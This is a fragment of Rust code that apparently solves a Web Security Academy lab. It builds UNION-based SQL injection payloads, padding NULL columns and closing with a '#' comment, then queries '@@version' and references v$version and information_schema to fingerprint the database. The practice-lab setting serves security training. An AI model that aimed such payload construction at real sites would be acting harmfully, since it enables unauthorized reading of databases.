...
async fn main() -> Result<(), Box<dyn Error>> {
    let host= "https://0a52007d03cd405d809a1cda000000cc.web-security-academy.net";
    ...
    //let from_string = " FROM information_schema.tables"
    let comment=encode("#").to_string();
    while true{
        let payload_to_check=format!("{base_payload}{}{comment}",nulls.join(","));
    ...
    let mut from_string = "FROM v$version";
    nulls[0]="@@version";
    //from_string="FROM v$version";
    let crafted_payload=format!("{base_payload}{}{comment}",nulls.join(","));
